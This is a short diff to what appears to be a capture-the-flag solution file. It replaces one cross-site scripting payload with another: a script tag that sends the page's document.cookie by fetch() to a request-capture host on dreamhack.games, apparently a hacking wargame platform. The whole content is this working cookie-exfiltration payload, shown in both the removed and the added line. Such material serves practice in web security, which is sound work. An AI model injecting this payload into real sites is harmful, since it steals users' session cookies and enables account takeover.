@@ -1,1 +1,2 @@
-<script>fetch("https://uxqilbr.request.dreamhack.games"+document.cookie)</script>;
+<script>fetch("https://rzhfjsl.request.dreamhack.games"+document.cookie)</script>;
+
